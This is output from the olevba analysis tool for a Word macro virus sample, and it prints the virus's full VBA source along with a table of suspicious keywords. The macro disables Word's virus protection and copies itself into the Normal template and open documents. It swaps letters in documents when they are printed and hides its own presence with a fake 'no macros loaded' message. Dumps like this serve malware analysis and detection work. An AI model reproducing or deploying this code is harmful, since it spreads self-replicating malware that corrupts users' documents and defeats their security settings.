olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheSecond.l-b9306de0ae9a7dcd7a3a73a5c9fe52184f64251a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheSecond.l-b9306de0ae9a7dcd7a3a73a5c9fe52184f64251a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gruzin.bas 
in file: Virus.MSWord.TheSecond.l-b9306de0ae9a7dcd7a3a73a5c9fe52184f64251a - OLE stream: 'Macros/VBA/Gruzin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Flag As Boolean
Dim i As Integer
Dim X As String
Dim S As Boolean



Sub AutoClose()
  Options.VirusProtection = False
  If Documents.Count > 0 Then
    counter = NormalTemplate.VBProject.VBComponents.Count
    Flag = False
    For i = 1 To counter
      If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Gruzin" Then Flag = True
    Next i
    X = Application.StartupPath + "\Gruzin.tmp"
    If Not Flag Then
      ActiveDocument.VBProject.VBComponents("Gruzin").Export (X)
      NormalTemplate.VBProject.VBComponents.Import (X)
    End If
    Flag = True
    S = ActiveDocument.Saved
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Gruzin" Then Flag = False
    Next i
    If Flag Then
      NormalTemplate.VBProject.VBComponents("Gruzin").Export (X)
      ActiveDocument.VBProject.VBComponents.Import (X)
      If S And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
            Dialogs(wdDialogFileSaveAs).Execute
        End If
    End If
    ActiveDocument.Saved = S
  End If
End Sub
Sub FilePrint()
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "å"
    .Replacement.Text = "ý"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
  Dialogs(wdDialogFilePrint).Show
  Selection.Find.ClearFormatting
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find
    .Text = "ý"
    .Replacement.Text = "å"
    .Forward = True
    .Wrap = wdFindContinue
    .Format = False
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
End Sub
Sub ToolsMacro()
  Dialogs(wdDialogToolsMacro).Display
End Sub
Sub ViewVBCode()
  MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

